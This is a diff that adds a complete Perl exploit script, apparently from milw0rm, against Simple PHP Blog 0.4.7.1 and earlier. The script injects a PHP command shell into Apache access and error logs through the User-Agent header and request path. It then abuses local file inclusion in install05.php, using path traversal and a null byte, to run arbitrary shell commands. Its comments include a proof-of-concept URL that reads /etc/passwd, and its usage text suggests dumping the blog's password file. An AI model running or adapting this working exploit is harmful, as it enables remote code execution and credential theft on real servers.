@@ -1,0 +1,126 @@
+#!/usr/bin/perl
+use IO::Socket;
+
+print "Simple PHP Blog <= 0.4.7.1 cmmnds xctn exploit\r\n";
+print "through arbitrary local inclusion\r\n";
+print "rgod rgod\@autistici.org\r\n";
+print "-> this works with magic_quotes_gpc = Off\r\n\r\n";
+
+# short explaination:
+# we have this code in install05.php:
+# <?php
+#	require_once('scripts/sb_functions.php');
+#	global $logged_in;
+#	$logged_in = logged_in( false, false );
+#
+#	read_config();
+#
+#	global $blog_config;
+#	if ( isset( $_GET[ 'blog_language' ] ) ) {
+#		$blog_config[ 'blog_language' ] = $_GET[ 'blog_language' ];
+#	}
+#
+#	require_once('languages/' . $blog_config[ 'blog_language' ] . '/strings.php');
+#	sb_language( 'install05' );
+# ?>
+# ...
+#
+# script is not deleted after installation, so, if magic_quotes_gpc = Off,
+# you can include an arbitrary file from local resources, poc:
+#
+# http://[target]/[path_to_blog]/install05.php?blog_language=../../../../../../etc/passwd%00
+#
+# (breaking path through a null char)
+#
+# it seems you cannot inject php code (php tags are converted to html entities)
+# in SPB resources, but you can inject a shell in Apache logs, so... :
+#
+# http://[target]/[path]/install05.php?blog_language=../../../../../../var/log/httpd/access_log%00&cmd=ls%20-la
+
+sub main::urlEncode {
+    my ($string) = @_;
+    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
+    #$string# =~ tr/.//;
+    return $string;
+ }
+
+if (@ARGV < 3)
+{
+print "Usage:\r\n";
+print "perl spb_0471_incl.pl SERVER PATH COMMAND\r\n\r\n";
+print "SERVER         - Server where Simple PHP Blog is installed.\r\n";
+print "PATH           - Path to Simple PHP Blog (ex: /spb/ or just /)\r\n";
+print "COMMAND        - A shell command (\"cat ./config/password.php\"\r\n";
+print "                 to see encrypted username & password)\r\n\r\n";
+print "Example:\r\n";
+print "perl spb_0471_incl.pl 192.168.1.3 /gbs/ ls -la\r\n";
+exit();
+}
+
+$serv=$ARGV[0];
+$path=$ARGV[1];
+$cmd=""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};
+
+print "[1] Injecting some code in log files ...\r\n";
+$CODE="<?php ob_clean();echo 666;passthru(\$_GET[cmd]);echo 666;die;?>";
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80")
+or die "[+] Connecting ... Could not connect to host.\n\n";
+print $sock "GET ".$path.$CODE." HTTP/1.1\r\n";
+print $sock "User-Agent: ".$CODE."\r\n";
+print $sock "Host: ".$serv."\r\n";
+print $sock "Connection: close\r\n\r\n";
+close($sock);
+
+# fill with possible locations
+my @paths= (
+"../../../../../../../../../../var/log/httpd/access_log",
+"../../../../../../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../../../../../../../etc/httpd/logs/acces_log",
+"../../../../../../../../../../etc/httpd/logs/acces.log",
+"../../../../../../../../../../etc/httpd/logs/error_log",
+"../../../../../../../../../../etc/httpd/logs/error.log",
+"../../../../../../../../../../var/www/logs/access_log",
+"../../../../../../../../../../var/www/logs/access.log",
+"../../../../../../../../../../usr/local/apache/logs/access_log",
+"../../../../../../../../../../usr/local/apache/logs/access.log",
+"../../../../../../../../../../var/log/apache/access_log",
+"../../../../../../../../../../var/log/apache/access.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/www/logs/error_log",
+"../../../../../../../../../../var/www/logs/error.log",
+"../../../../../../../../../../usr/local/apache/logs/error_log",
+"../../../../../../../../../../usr/local/apache/logs/error.log",
+"../../../../../../../../../../var/log/apache/error_log",
+"../../../../../../../../../../var/log/apache/error.log",
+"../../../../../../../../../../var/log/access_log",
+"../../../../../../../../../../var/log/error_log"
+);
+
+  for ($i=0; $i<=$#paths; $i++)
+  {
+    $a = $i + 2;
+    print "[".$a."] trying with ".$paths[$i]."%00 for blog_language argument...\r\n";
+    $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80")
+    or die "[+] Connecting ... Could not connect to host.\n\n";
+    print $sock "GET ".$path."install05.php?cmd=".$cmd."&blog_language=".urlEncode($paths[$i])."%00 HTTP/1.1\r\n";
+    print $sock "Host: ".$serv."\r\n";
+    print $sock "Connection: close\r\n\r\n";
+    $out='';
+    while ($answer = <$sock>) {
+    $out.=$answer;
+    }
+    close($sock);
+    @temp= split /666/,$out,3;
+    if ($#temp>1) {print "\r\nExploit succeeded...\r\n".$temp[1];exit();}
+
+  }
+  #if you are here...
+  print "\r\nExploit failed...\r\n";
+
+# milw0rm.com [2006-03-13]
